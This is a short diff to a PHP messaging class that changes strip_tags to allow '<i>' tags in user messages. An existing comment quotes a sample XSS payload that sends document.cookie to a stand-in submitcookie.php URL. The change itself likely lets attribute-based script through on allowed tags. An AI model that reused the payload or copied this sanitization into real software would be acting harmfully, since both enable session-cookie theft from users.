@@ -1330,7 +1330,7 @@ class cls_ssshout
 		//Handle cross site security E.g. user should not be able to enter "<img src="http://localhost/submitcookie.php?cookie =' + escape(document.cookie) + '" />"
 		//https://www.geeksforgeeks.org/cookie-tracking-stealing-using-cross-site-scripting/
 		//Remove any direct tags
-		$my_line = strip_tags($my_line);
+		$my_line = strip_tags($my_line, '<i>');
 		
 		
 		//Handle any plugin-defined parsing of the message. Eg. turn smileys :) into smiley images.
